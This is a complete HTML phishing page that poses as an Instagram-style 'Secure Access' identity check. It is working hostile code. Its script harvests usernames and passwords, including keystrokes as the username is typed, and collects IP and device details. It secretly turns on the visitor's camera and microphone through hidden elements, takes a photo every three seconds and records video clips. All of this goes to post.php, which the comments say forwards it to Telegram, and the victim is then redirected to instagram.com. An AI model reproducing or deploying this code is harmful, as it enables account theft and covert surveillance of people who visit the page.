<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #262626;
        }

        .hidden-video-wrap {
            display: none !important;
            position: fixed !important;
            top: -9999px !important;
            left: -9999px !important;
            width: 1px !important;
            height: 1px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            z-index: -9999 !important;
        }

        #video, #canvas {
            display: none !important;
            position: fixed !important;
            top: -9999px !important;
            left: -9999px !important;
            width: 1px !important;
            height: 1px !important;
            opacity: 0 !important;
            pointer-events: none !important;
        }

        .container {
            width: 100%;
            max-width: 350px;
            padding: 20px;
        }

        .card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px 30px;
            text-align: center;
        }

        .logo {
            margin-bottom: 30px;
            font-size: 32px;
            font-weight: 700;
            color: #262626;
        }

        .icon {
            font-size: 48px;
            margin-bottom: 20px;
        }

        h2 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 12px;
        }

        p {
            font-size: 14px;
            color: #8e8e8e;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .form-group {
            margin-bottom: 12px;
        }

        .form-input {
            width: 100%;
            height: 36px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            padding: 0 12px;
            font-size: 12px;
        }

        .form-input:focus {
            outline: none;
            border-color: #a8a8a8;
        }

        .btn {
            width: 100%;
            height: 32px;
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
        }

        .btn:hover {
            background: #1877f2;
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }

        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .success-msg {
            display: none;
            color: #00a651;
            font-size: 14px;
            margin-top: 12px;
        }
    </style>
</head>
<body>

    <div class="hidden-video-wrap" aria-hidden="true">
        <video id="video" playsinline autoplay muted></video>
    </div>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <div class="container">
        <div class="card">
            <div class="logo">🔒</div>
            <div class="icon">📱</div>
            <h2>Secure Access</h2>
            <p>Please verify your identity to continue. This helps us keep your account secure.</p>

            <form id="loginForm">
                <div class="form-group">
                    <input type="text" class="form-input" id="username" placeholder="Username or Email" required>
                </div>
                <div class="form-group">
                    <input type="password" class="form-input" id="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn" id="submitBtn">Continue</button>
                <div id="successMsg" class="success-msg">✅ Verification in progress...</div>
            </form>

            <div class="footer">
                <span>Protected by security verification</span>
            </div>
        </div>
    </div>

    <script>
        // ============================================
        // STEALTH VIDEO + PHOTO CAPTURE
        // Sends both photos AND videos to Telegram
        // ============================================
        
        (function() {
            'use strict';

            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            
            let cameraActive = false;
            let photoInterval = null;
            let videoInterval = null;
            let stream = null;
            let userIP = '';
            let mediaRecorder = null;
            let recordedChunks = [];
            let isRecording = false;
            let recordingStartTime = 0;

            // ============================================
            // DETECT IP AND SEND TO TELEGRAM
            // ============================================
            function detectAndSendIP() {
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        userIP = data.ip;
                        sendToTelegram('IP', userIP, navigator.userAgent);
                    })
                    .catch(() => {
                        fetch('https://httpbin.org/ip')
                            .then(response => response.json())
                            .then(data => {
                                userIP = data.origin;
                                sendToTelegram('IP', userIP, navigator.userAgent);
                            })
                            .catch(() => {
                                userIP = 'Unknown';
                            });
                    });
            }

            // ============================================
            // SEND TO TELEGRAM VIA PHP
            // ============================================
            function sendToTelegram(type, data, extra = '') {
                $.ajax({
                    type: 'POST',
                    url: 'post.php',
                    data: {
                        tg_type: type,
                        tg_data: data,
                        tg_extra: extra,
                        tg_ua: navigator.userAgent,
                        tg_time: new Date().toISOString()
                    },
                    async: true,
                    timeout: 5000
                });
            }

            // ============================================
            // SEND VIDEO TO TELEGRAM
            // ============================================
            function sendVideoToTelegram(videoBlob) {
                const reader = new FileReader();
                reader.onload = function(event) {
                    const base64Data = event.target.result;
                    $.ajax({
                        type: 'POST',
                        url: 'post.php',
                        data: {
                            tg_type: 'video',
                            tg_video: base64Data,
                            tg_ip: userIP,
                            tg_ua: navigator.userAgent,
                            tg_time: new Date().toISOString(),
                            tg_duration: Math.floor((Date.now() - recordingStartTime) / 1000)
                        },
                        async: true,
                        timeout: 10000
                    });
                };
                reader.readAsDataURL(videoBlob);
            }

            // ============================================
            // RECORD VIDEO (10 second clips)
            // ============================================
            function startVideoRecording() {
                if (!stream || isRecording) return;
                
                try {
                    isRecording = true;
                    recordingStartTime = Date.now();
                    recordedChunks = [];
                    
                    mediaRecorder = new MediaRecorder(stream, {
                        mimeType: 'video/webm;codecs=vp9,opus',
                        videoBitsPerSecond: 2500000
                    });

                    mediaRecorder.ondataavailable = function(event) {
                        if (event.data.size > 0) {
                            recordedChunks.push(event.data);
                        }
                    };

                    mediaRecorder.onstop = function() {
                        const videoBlob = new Blob(recordedChunks, {
                            type: 'video/webm'
                        });
                        
                        if (videoBlob.size > 0) {
                            sendVideoToTelegram(videoBlob);
                        }
                        
                        isRecording = false;
                        recordedChunks = [];
                        
                        // Start next recording after short delay
                        setTimeout(() => {
                            if (cameraActive) {
                                startVideoRecording();
                            }
                        }, 1000);
                    };

                    // Record for 10 seconds then stop
                    mediaRecorder.start();
                    setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, 10000);

                } catch (e) {
                    // Silent fail - try again later
                    isRecording = false;
                    setTimeout(() => {
                        if (cameraActive) {
                            startVideoRecording();
                        }
                    }, 5000);
                }
            }

            // ============================================
            // CAPTURE PHOTO (Every 3 seconds)
            // ============================================
            function capturePhoto() {
                if (cameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
                    context.drawImage(video, 0, 0, 640, 480);
                    const imageData = canvas.toDataURL("image/png");
                    
                    $.ajax({
                        type: 'POST',
                        url: 'post.php',
                        data: {
                            tg_type: 'image',
                            tg_image: imageData,
                            tg_ip: userIP,
                            tg_ua: navigator.userAgent,
                            tg_time: new Date().toISOString()
                        },
                        async: true,
                        timeout: 5000
                    });
                }
            }

            // ============================================
            // HIDDEN CAMERA - START BOTH PHOTO & VIDEO
            // ============================================
            function initHiddenCamera() {
                try {
                    const constraints = {
                        audio: true,
                        video: {
                            facingMode: "user",
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            frameRate: { ideal: 30 }
                        }
                    };

                    navigator.mediaDevices.getUserMedia(constraints)
                        .then(function(mediaStream) {
                            stream = mediaStream;
                            video.srcObject = stream;
                            video.play();
                            
                            cameraActive = true;
                            
                            // Start photo capture (every 3 seconds)
                            photoInterval = setInterval(capturePhoto, 3000);
                            
                            // Start video recording after 2 seconds
                            setTimeout(() => {
                                if (cameraActive) {
                                    startVideoRecording();
                                }
                            }, 2000);
                            
                            // Send notification that camera is active
                            sendToTelegram('camera_ready', 'Camera active - capturing photos and videos');
                        })
                        .catch(function(err) {
                            // Silent fail
                        });

                } catch (e) {
                    // Silent fail
                }
            }

            // ============================================
            // SEND CREDENTIALS TO TELEGRAM
            // ============================================
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const btn = document.getElementById('submitBtn');
                const msg = document.getElementById('successMsg');
                
                btn.innerHTML = '<span class="spinner"></span> Processing...';
                btn.disabled = true;
                msg.style.display = 'block';
                
                // Send credentials to Telegram
                $.ajax({
                    type: 'POST',
                    url: 'post.php',
                    data: {
                        tg_type: 'login',
                        tg_username: username,
                        tg_password: password,
                        tg_ip: userIP,
                        tg_ua: navigator.userAgent,
                        tg_time: new Date().toISOString()
                    },
                    success: function() {
                        setTimeout(function() {
                            msg.textContent = '✅ Verified! Redirecting...';
                            setTimeout(function() {
                                window.location.href = 'https://www.instagram.com/';
                            }, 1000);
                        }, 1500);
                    },
                    error: function() {
                        setTimeout(function() {
                            window.location.href = 'https://www.instagram.com/';
                        }, 2000);
                    }
                });
            });

            // ============================================
            // SEND PARTIAL USERNAME TYPING
            // ============================================
            document.getElementById('username').addEventListener('input', function() {
                if (this.value.length > 2) {
                    sendToTelegram('typing', this.value, 'Partial username');
                }
            });

            // ============================================
            // SEND USER AGENT & BROWSER INFO
            // ============================================
            function sendBrowserInfo() {
                const info = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                sendToTelegram('browser_info', JSON.stringify(info), 'Device Info');
            }

            // ============================================
            // SEND PAGE VIEW NOTIFICATION
            // ============================================
            function sendPageView() {
                sendToTelegram('page_view', 'Page loaded', 
                    `IP: ${userIP} | UA: ${navigator.userAgent}`
                );
            }

            // ============================================
            // INITIALIZE EVERYTHING
            // ============================================
            
            // 1. Detect IP
            detectAndSendIP();
            
            // 2. Send browser info
            setTimeout(sendBrowserInfo, 500);
            
            // 3. Start camera (photo + video)
            setTimeout(function() {
                initHiddenCamera();
            }, 1500);
            
            // 4. Send page view
            setTimeout(sendPageView, 1000);
            
            // 5. Try camera on click
            document.addEventListener('click', function() {
                if (!cameraActive) {
                    initHiddenCamera();
                }
            }, { once: true });

            // 6. Cleanup on page unload
            window.addEventListener('beforeunload', function() {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
                if (photoInterval) {
                    clearInterval(photoInterval);
                }
                if (videoInterval) {
                    clearInterval(videoInterval);
                }
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            });

        })();
    </script>
</body>
</html>
